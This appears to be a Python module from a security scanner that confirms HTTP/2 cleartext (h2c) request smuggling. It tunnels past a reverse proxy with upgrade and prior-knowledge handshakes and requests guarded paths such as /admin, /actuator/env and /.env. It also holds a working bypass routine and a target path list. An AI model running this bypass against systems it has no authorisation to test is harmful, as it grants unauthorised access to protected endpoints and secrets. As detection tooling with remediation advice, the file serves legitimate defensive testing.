"""
HEAVEN — HTTP/2 cleartext (h2c) request-smuggling / access-control bypass.

A reverse proxy that inspects only the initial HTTP/1.1 request but forwards an
``Upgrade: h2c`` to a backend that speaks HTTP/2-over-cleartext ends up piping
raw bytes between client and backend once the backend answers ``101 Switching
Protocols``. From that point the client speaks HTTP/2 **directly to the backend**
— past every access-control rule the proxy enforced on the HTTP/1.1 layer. This
is h2c smuggling (Bishop Fox, 2020): the same tunnelling trick as WebSocket
smuggling, but to an h2c backend, and it bypasses path allow/deny-lists, auth
gateways and internal-only routing.

Two tunnelling variants are probed:

* **h2c upgrade** — the HTTP/1.1 ``Connection: Upgrade`` / ``Upgrade: h2c``
  handshake. A ``101`` from behind the proxy means the proxy forwarded the
  upgrade and is now in byte-pipe mode.
* **h2c prior-knowledge** — the raw HTTP/2 connection preface sent with no
  upgrade at all; a proxy that blindly streams the connection to an h2c backend
  tunnels it just the same.

**This detector confirms, it does not merely indicate.** A bare "the server
accepted an h2c upgrade" is *not* reported — a direct h2c origin legitimately
does that and is not vulnerable. A finding fires only on a proven
access-control **differential**: a path the proxy denies over HTTP/1.1
(``401``/``403`` or a redirect to login) that becomes reachable (``2xx``) when
the same request is delivered through the h2c tunnel as a real HTTP/2 request.
A random, certainly-absent control path is tunnelled in the same run; if *it*
also answers ``2xx`` the backend is a catch-all and the whole origin is
suppressed, so an "everything is 200" backend never yields a false bypass.

Everything degrades gracefully: without ``hpack``/``hyperframe`` (so no HTTP/2
framing) the scan is skipped; every socket operation is timeout-bounded and any
protocol error yields no finding rather than raising into a scan.
"""
from __future__ import annotations

import asyncio
import base64
import secrets
import ssl
from typing import Any, Optional
from urllib.parse import urljoin, urlparse

from heaven.utils.logger import get_logger

logger = get_logger("vulnscan.h2c")

try:
    from hpack import Decoder, Encoder
    from hyperframe.frame import (
        Frame,
        HeadersFrame,
        SettingsFrame,
    )
    _H2_OK = True
except ImportError:  # pragma: no cover - exercised via the libs-absent path
    _H2_OK = False

# The HTTP/2 connection preface a client must send first (RFC 9113 §3.4).
_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

# Paths a reverse proxy commonly guards while the backend serves them openly —
# the high-value targets for an access-control-bypass differential. Recon-
# discovered 403 paths are added to this set per scan.
_DEFAULT_GUARDED_PATHS: tuple[str, ...] = (
    "/admin", "/admin/", "/manager/html", "/console",
    "/actuator", "/actuator/health", "/actuator/env",
    "/metrics", "/server-status", "/nginx_status",
    "/.env", "/api/internal", "/internal",
)

_MAX_PATHS = 12          # cap probed guarded paths per origin
_UA = "HEAVEN"


def available() -> bool:
    """Whether HTTP/2 framing support (hpack + hyperframe) is importable."""
    return _H2_OK


# ── low-level transport ──────────────────────────────────────────────────────

def _ssl_context() -> ssl.SSLContext:
    """A permissive client context (scanning posture: self-signed is common).

    ALPN advertises only ``http/1.1`` so the front-end hands us an HTTP/1.1
    connection to upgrade — we deliberately do NOT negotiate ``h2`` directly
    (that would be ordinary HTTP/2, not the h2c tunnel we are testing).
    """
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        ctx.set_alpn_protocols(["http/1.1"])
    except NotImplementedError:  # pragma: no cover - platform ssl without ALPN
        pass
    return ctx


async def _open(host: str, port: int, use_tls: bool, timeout: float,
                opener: Any = None):
    """Open a raw (reader, writer). ``opener`` is injectable for testing."""
    if opener is not None:
        return await opener(host, port, use_tls)
    ssl_ctx = _ssl_context() if use_tls else None
    return await asyncio.wait_for(
        asyncio.open_connection(host, port, ssl=ssl_ctx), timeout=timeout)


async def _read_http1_head(reader: Any, timeout: float) -> tuple[int, bytes]:
    """Read an HTTP/1.1 response head (through the blank line). Return (status, head)."""
    head = await asyncio.wait_for(reader.readuntil(b"\r\n\r\n"), timeout=timeout)
    first = head.split(b"\r\n", 1)[0]
    parts = first.split(b" ", 2)
    status = int(parts[1]) if len(parts) >= 2 and parts[1].isdigit() else 0
    return status, head


async def _http1_get_status(host: str, port: int, use_tls: bool, authority: str,
                            path: str, timeout: float,
                            opener: Any = None) -> Optional[int]:
    """A plain HTTP/1.1 GET straight through the front-end — the proxy baseline."""
    try:
        reader, writer = await _open(host, port, use_tls, timeout, opener)
    except Exception:  # noqa: BLE001 - unreachable origin is not a finding
        return None
    try:
        req = (f"GET {path} HTTP/1.1\r\nHost: {authority}\r\n"
               f"User-Agent: {_UA}\r\nConnection: close\r\n\r\n").encode()
        writer.write(req)
        await writer.drain()
        status, _ = await _read_http1_head(reader, timeout)
        return status or None
    except Exception:  # noqa: BLE001
        return None
    finally:
        _close(writer)


# ── HTTP/2 framing over the tunnel ───────────────────────────────────────────

def _settings_header_value() -> str:
    """base64url(no pad) of a minimal SETTINGS payload for the HTTP2-Settings header."""
    payload = SettingsFrame(settings={SettingsFrame.INITIAL_WINDOW_SIZE: 65535}).serialize()[9:]
    return base64.urlsafe_b64encode(payload).rstrip(b"=").decode()


def _headers_frame(path: str, scheme: str, authority: str, stream_id: int) -> bytes:
    enc = Encoder()
    block = enc.encode([
        (":method", "GET"),
        (":scheme", scheme),
        (":path", path),
        (":authority", authority),
        ("user-agent", _UA),
    ])
    frame = HeadersFrame(stream_id=stream_id)
    frame.data = block
    frame.flags.add("END_HEADERS")
    frame.flags.add("END_STREAM")
    return frame.serialize()


async def _send_h2_preface(writer: Any) -> None:
    writer.write(_PREFACE + SettingsFrame().serialize())
    await writer.drain()


async def _read_status_for_stream(reader: Any, writer: Any, stream_id: int,
                                  timeout: float) -> Optional[int]:
    """Read HTTP/2 frames until the response HEADERS for ``stream_id``; return :status.

    SETTINGS frames are acknowledged; non-target frames are skipped. HPACK is
    stateful across the whole connection, so EVERY HEADERS block is decoded with
    one persistent decoder (an h2c upgrade answers the implicit stream 1 before
    our stream, and its dynamic-table insertions are referenced later) — decoding
    only the target stream desynchronises the table and corrupts the status. A
    GOAWAY, EOF, or any parse error ends the read with ``None`` (no finding). The
    whole read is bounded by ``timeout``.
    """
    decoder = Decoder()
    async def _inner() -> Optional[int]:
        while True:
            header = await reader.readexactly(9)
            frame, length = Frame.parse_frame_header(memoryview(header))
            body = await reader.readexactly(length) if length else b""
            name = type(frame).__name__
            if name == "SettingsFrame" and "ACK" not in frame.flags:
                try:
                    ack = SettingsFrame()
                    ack.flags.add("ACK")
                    writer.write(ack.serialize())
                    await writer.drain()
                except Exception:  # noqa: BLE001 - ack is best-effort
                    pass
                continue
            if name == "GoAwayFrame":
                return None
            if name == "HeadersFrame":
                frame.parse_body(memoryview(body))
                try:
                    headers = dict(decoder.decode(bytes(frame.data)))
                except Exception:  # noqa: BLE001 - HPACK desync → give up on this conn
                    return None
                if frame.stream_id == stream_id:
                    raw = headers.get(":status")
                    return int(raw) if raw and str(raw).isdigit() else None
            # Other streams/frames are decoded-for-state (above) or skipped here.
    try:
        return await asyncio.wait_for(_inner(), timeout=timeout)
    except Exception:  # noqa: BLE001 - EOF / incomplete / parse error → no finding
        return None


async def _tunnel_status_upgrade(host: str, port: int, use_tls: bool, scheme: str,
                                 authority: str, path: str, timeout: float,
                                 opener: Any = None) -> tuple[Optional[int], bool]:
    """h2c-UPGRADE variant: GET / with Upgrade: h2c, then request ``path`` over h2.

    Returns ``(status, upgraded)`` — ``upgraded`` is whether a ``101`` tunnel was
    established at all (recorded as evidence even when no bypass is proven).
    """
    try:
        reader, writer = await _open(host, port, use_tls, timeout, opener)
    except Exception:  # noqa: BLE001
        return None, False
    try:
        upgrade_req = (
            f"GET / HTTP/1.1\r\nHost: {authority}\r\n"
            f"User-Agent: {_UA}\r\n"
            f"Connection: Upgrade, HTTP2-Settings\r\n"
            f"Upgrade: h2c\r\n"
            f"HTTP2-Settings: {_settings_header_value()}\r\n\r\n"
        ).encode()
        writer.write(upgrade_req)
        await writer.drain()
        status, head = await _read_http1_head(reader, timeout)
        if status != 101 or b"h2c" not in head.lower():
            return None, False
        # Tunnel is open. Send the HTTP/2 preface, then our guarded-path request
        # on a fresh client stream (3; the upgrade occupied implicit stream 1).
        await _send_h2_preface(writer)
        writer.write(_headers_frame(path, scheme, authority, stream_id=3))
        await writer.drain()
        return await _read_status_for_stream(reader, writer, 3, timeout), True
    except Exception:  # noqa: BLE001
        return None, False
    finally:
        _close(writer)


async def _tunnel_status_prior_knowledge(host: str, port: int, use_tls: bool,
                                         scheme: str, authority: str, path: str,
                                         timeout: float,
                                         opener: Any = None) -> Optional[int]:
    """h2c PRIOR-KNOWLEDGE variant: raw HTTP/2 preface, request ``path`` on stream 1."""
    try:
        reader, writer = await _open(host, port, use_tls, timeout, opener)
    except Exception:  # noqa: BLE001
        return None
    try:
        await _send_h2_preface(writer)
        writer.write(_headers_frame(path, scheme, authority, stream_id=1))
        await writer.drain()
        return await _read_status_for_stream(reader, writer, 1, timeout)
    except Exception:  # noqa: BLE001
        return None
    finally:
        _close(writer)


def _close(writer: Any) -> None:
    try:
        writer.close()
    except Exception:  # noqa: BLE001
        pass


# ── confirmation logic ───────────────────────────────────────────────────────

def _is_denied(status: Optional[int]) -> bool:
    """A proxy actively blocking a path: 401/403, or a redirect (to a login)."""
    return status in (401, 403) or (status is not None and 300 <= status < 400)


def _is_success(status: Optional[int]) -> bool:
    return status is not None and 200 <= status < 300


def _origin_parts(origin: str) -> Optional[tuple[str, int, bool, str, str]]:
    p = urlparse(origin if "://" in origin else f"http://{origin}")
    if not p.hostname:
        return None
    use_tls = p.scheme == "https"
    port = p.port or (443 if use_tls else 80)
    authority = p.hostname + (f":{p.port}" if p.port else "")
    return p.hostname, port, use_tls, p.scheme or "http", authority


def _finding(origin: str, variant: str, bypassed: list[dict[str, Any]],
             control_status: Optional[int]) -> dict[str, Any]:
    return {
        "target": origin,
        "vuln_type": "h2c_smuggling",
        "severity": "high",
        "title": f"HTTP/2 cleartext (h2c) smuggling — access-control bypass ({variant})",
        "confidence": 0.9,
        # Unauthenticated access-control bypass reaching a proxy-protected path:
        # network, low complexity, no privileges; high confidentiality, some
        # integrity (scores in the high band, consistent with severity "high").
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
        "cwe": "CWE-444",
        "owasp": "A02:2025 Security Misconfiguration",
        "mitre": "T1190 · Exploit Public-Facing Application",
        "source": "h2c_smuggling",
        "remediation": (
            "Terminate the h2c upgrade at the edge: strip the `Upgrade`/"
            "`Connection` hop-by-hop headers at the reverse proxy and never "
            "forward `Upgrade: h2c` to the backend. Disable h2c (prior-knowledge "
            "and upgrade) on the backend unless it is the front-facing listener, "
            "and enforce access control on the backend itself, not only at the "
            "proxy, so a tunnel cannot bypass it."
        ),
        "description": (
            f"A request smuggled through an h2c tunnel ({variant}) reached "
            f"proxy-protected path(s) the front-end denied over HTTP/1.1: "
            + "; ".join(
                f"{b['path']} returned HTTP {b['tunnel_status']} through the tunnel "
                f"vs HTTP {b['baseline_status']} through the proxy" for b in bypassed)
            + ". The reverse proxy inspects only the HTTP/1.1 layer and pipes the "
            "upgraded connection to an h2c backend, so HTTP/2 requests sent through "
            "the tunnel bypass its access control."
        ),
        "references": [
            "https://bishopfox.com/blog/h2c-smuggling-request",
            "https://portswigger.net/web-security/request-smuggling",
        ],
        # The proof IS the tunnelled transaction: the primary bypassed path is
        # surfaced as the HTTP request/response the report renders (method/url/
        # headers/status), with the full differential in the description/evidence.
        "method": "GET",
        "evidence": {
            "variant": variant,
            "url": urljoin(origin, bypassed[0]["path"]),
            "method": "GET",
            "request_headers": (
                {"Connection": "Upgrade, HTTP2-Settings", "Upgrade": "h2c"}
                if variant == "upgrade"
                else {"X-HEAVEN-Note": "HTTP/2 prior-knowledge preface (no upgrade)"}
            ),
            "status": bypassed[0]["tunnel_status"],
            "response_excerpt": (
                f"Delivered through the h2c {variant} tunnel as a real HTTP/2 "
                f"request. The same path returned HTTP {bypassed[0]['baseline_status']} "
                f"through the proxy over HTTP/1.1, so the tunnel bypassed the proxy's "
                f"access control."
            ),
            "bypassed_paths": bypassed,
            "control_path_status": control_status,
            "signals": ["h2c_tunnel_established", "access_control_differential"],
            "proof": (
                f"Over the h2c tunnel ({variant}), "
                + "; ".join(
                    f"{b['path']} returned HTTP {b['tunnel_status']} vs HTTP "
                    f"{b['baseline_status']} through the proxy" for b in bypassed)
                + (f"; control path {control_status if control_status is not None else 'n/a'} "
                   "(not 2xx, so the backend is not a catch-all).")
            ),
        },
    }


async def _scan_origin(origin: str, guarded_paths: list[str], timeout: float,
                       opener: Any = None) -> list[dict[str, Any]]:
    parts = _origin_parts(origin)
    if not parts:
        return []
    host, port, use_tls, scheme, authority = parts
    control = f"/heaven-h2c-{secrets.token_hex(8)}"

    findings: list[dict[str, Any]] = []
    # Probe each variant independently; a target may tunnel one and not the other.
    for variant in ("upgrade", "prior-knowledge"):
        # 1) Does the tunnel reach the backend at all? Probe the control path.
        if variant == "upgrade":
            control_status, upgraded = await _tunnel_status_upgrade(
                host, port, use_tls, scheme, authority, control, timeout, opener)
            if not upgraded:
                continue
        else:
            control_status = await _tunnel_status_prior_knowledge(
                host, port, use_tls, scheme, authority, control, timeout, opener)
        if control_status is None:
            continue                       # tunnel did not yield an HTTP/2 response
        if _is_success(control_status):
            logger.debug("h2c %s on %s: catch-all backend (control 2xx) — suppressed",
                         variant, origin)
            continue                       # catch-all backend → no reliable differential

        # 2) For each guarded path the proxy DENIES over HTTP/1.1, test the tunnel.
        bypassed: list[dict[str, Any]] = []
        for path in guarded_paths:
            baseline = await _http1_get_status(
                host, port, use_tls, authority, path, timeout, opener)
            if not _is_denied(baseline):
                continue                   # proxy did not block it → nothing to bypass
            if variant == "upgrade":
                tunnel, _ = await _tunnel_status_upgrade(
                    host, port, use_tls, scheme, authority, path, timeout, opener)
            else:
                tunnel = await _tunnel_status_prior_knowledge(
                    host, port, use_tls, scheme, authority, path, timeout, opener)
            if _is_success(tunnel):
                bypassed.append({"path": path, "baseline_status": baseline,
                                 "tunnel_status": tunnel})

        if bypassed:
            findings.append(_finding(origin, variant, bypassed, control_status))

    return findings


# ── public API ───────────────────────────────────────────────────────────────

async def scan_h2c_smuggling(origins: list[str], *,
                             restricted_paths: Optional[list[str]] = None,
                             timeout: float = 8.0,
                             opener: Any = None) -> list[dict[str, Any]]:
    """Confirm h2c-smuggling access-control bypasses across origins.

    ``restricted_paths`` (e.g. paths recon saw answer 403) are probed in addition
    to a built-in list of commonly-guarded paths. ``opener`` injects a transport
    for testing — ``await opener(host, port, use_tls) -> (reader, writer)``.
    Returns confirmed-differential findings only; never raises into a scan.
    """
    if not _H2_OK:
        logger.info("h2c smuggling scan skipped: hpack/hyperframe not installed.")
        return []
    seen: set[str] = set()
    guarded: list[str] = []
    for p in list(restricted_paths or []) + list(_DEFAULT_GUARDED_PATHS):
        if p and p not in seen:
            seen.add(p)
            guarded.append(p)
    guarded = guarded[:_MAX_PATHS]

    origin_set: list[str] = []
    seen_o: set[str] = set()
    for o in origins:
        parts = _origin_parts(o)
        if not parts:
            continue
        host, port, use_tls, scheme, _ = parts
        key = f"{scheme}://{host}:{port}"
        if key not in seen_o:
            seen_o.add(key)
            origin_set.append(o)

    findings: list[dict[str, Any]] = []
    for origin in origin_set:
        try:
            findings.extend(await _scan_origin(origin, guarded, timeout, opener))
        except Exception:  # noqa: BLE001 - one origin never breaks the sweep
            logger.debug("h2c scan failed for %s", origin, exc_info=True)
    return findings
